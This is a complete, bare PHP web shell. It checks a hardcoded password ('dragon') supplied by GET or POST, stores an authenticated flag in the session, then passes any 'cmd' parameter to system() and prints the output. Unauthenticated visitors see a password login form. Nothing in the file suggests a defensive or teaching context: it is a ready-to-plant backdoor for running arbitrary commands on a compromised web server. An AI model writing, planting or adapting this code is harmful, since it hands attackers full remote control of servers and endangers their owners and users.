<?php
@error_reporting(0);
session_start();
$pass = @$_GET['pass'] ?: @$_POST['pass'];
$cmd = @$_GET['cmd'] ?: @$_POST['cmd'];
if($pass=='dragon') {
    $_SESSION['auth']=1;
}
if(isset($_SESSION['auth']) && $cmd) {
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
if(!isset($_SESSION['auth'])) {
    echo "<form method='post'>";
    echo "<input type='password' name='pass' placeholder='Password'>";
    echo "<input type='submit' value='Login'>";
    echo "</form>";
}
?>